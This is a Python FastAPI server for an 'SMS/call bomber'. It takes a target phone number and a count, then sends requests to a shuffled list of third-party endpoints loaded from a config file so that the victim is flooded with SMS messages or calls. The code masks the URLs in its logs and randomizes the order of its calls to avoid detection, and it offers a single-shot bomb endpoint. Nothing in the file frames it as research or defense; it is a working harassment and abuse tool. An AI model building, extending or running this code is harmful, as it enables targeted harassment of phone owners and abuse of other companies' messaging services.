
import asyncio
import json
import random
import requests
from fastapi import FastAPI, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any

# Import the API lists
try:
    try:
        from .api_config import apis, call_apis
    except (ImportError, ValueError):
        from api_config import apis, call_apis
except ImportError:
    import sys
    import os
    sys.path.append(os.getcwd())
    with open('api/api_config.py', 'r', encoding='utf-8') as f:
        content = f.read()
    import json as json_mod
    import random as random_mod
    env = {'json': json_mod, 'random': random_mod}
    exec(content, env)
    apis = env.get('apis', [])
    call_apis = env.get('call_apis', [])

app = FastAPI()

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class BombRequest(BaseModel):
    phone: str
    count: int = 10
    mode: str = "sms"

# In-memory status tracking
bombing_status = {}
stop_signals = set()

async def send_bomb(phone: str, count: int, bomb_id: str):
    # Ensure total and sent are always integers to prevent NaN on frontend
    bombing_status[bomb_id] = {"status": "running", "sent": 0, "total": count, "logs": []}
    
    # Shuffle APIs to be less predictable
    local_apis = apis.copy()
    random.shuffle(local_apis)
    
    sent_count = 0
    # Limit to count or available APIs
    max_to_send = min(count, len(local_apis))
    
    for i in range(max_to_send):
        if bomb_id in stop_signals:
            bombing_status[bomb_id]["status"] = "stopped"
            bombing_status[bomb_id]["logs"].append("Operation stopped by user.")
            stop_signals.remove(bomb_id)
            return

        api = local_apis[i]
        url = api["url"]
        method = api["method"]
        headers = api.get("headers", {})
        data_func = api.get("data")
        
        # Format URL if it's a template
        formatted_url = url.replace("{phone}", phone)
        
        payload = None
        if data_func:
            try:
                if callable(data_func):
                    payload = data_func(phone)
                else:
                    payload = data_func.replace("{phone}", phone)
            except Exception as e:
                continue

        try:
            # Mask URL for logs
            masked_url = f"API_{i+1} [****{url[-4:] if len(url)>4 else ''}]"
            
            # Use a timeout to not get stuck
            if method == "POST":
                # Handle string vs dict payload
                if isinstance(payload, str):
                    try:
                        json_payload = json.loads(payload)
                        response = requests.post(formatted_url, json=json_payload, headers=headers, timeout=5)
                    except:
                        response = requests.post(formatted_url, data=payload, headers=headers, timeout=5)
                else:
                    response = requests.post(formatted_url, json=payload, headers=headers, timeout=5)
            else:
                response = requests.get(formatted_url, headers=headers, timeout=5)
            
            sent_count += 1
            bombing_status[bomb_id]["sent"] = sent_count
            bombing_status[bomb_id]["logs"].append(f"Success: {masked_url}")
            
        except Exception as e:
             # Masked log even on failure
             masked_url = f"API_{i+1}"
             bombing_status[bomb_id]["logs"].append(f"Failed: {masked_url}")
            
        # Small delay to avoid overloading
        await asyncio.sleep(0.5)

    bombing_status[bomb_id]["status"] = "completed"

@app.post("/api/bomb/single")
async def bomb_single(request: BombRequest):
    # Pick the correct API list based on mode
    api_list = call_apis if request.mode == "call" else apis
    if not api_list:
         return {"success": False, "error": f"No APIs found for {request.mode} mode"}
         
    api = random.choice(api_list)
    phone = request.phone
    
    url = api["url"]
    method = api["method"]
    headers = api.get("headers", {})
    data_func = api.get("data")
    
    # Format URL if it's a template
    formatted_url = url.replace("{phone}", phone)
    
    payload = None
    if data_func:
        try:
            if callable(data_func):
                payload = data_func(phone)
            else:
                payload = data_func.replace("{phone}", phone)
        except:
            return {"success": False, "error": "Formatting error"}

    try:
        # Masked URL for logs
        masked_url = f"API_{random.randint(1,99)} [****{url[-4:] if len(url)>4 else ''}]"
        
        if method == "POST":
            if isinstance(payload, str):
                try:
                    json_payload = json.loads(payload)
                    response = requests.post(formatted_url, json=json_payload, headers=headers, timeout=5)
                except:
                    response = requests.post(formatted_url, data=payload, headers=headers, timeout=5)
            else:
                response = requests.post(formatted_url, json=payload, headers=headers, timeout=5)
        else:
            response = requests.get(formatted_url, headers=headers, timeout=5)
        
        return {
            "success": True, 
            "log": f"Success: {masked_url}",
            "status_code": response.status_code
        }
    except Exception as e:
        return {
            "success": False, 
            "log": f"Failed: API_{random.randint(1,99)}",
            "error": str(e)
        }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
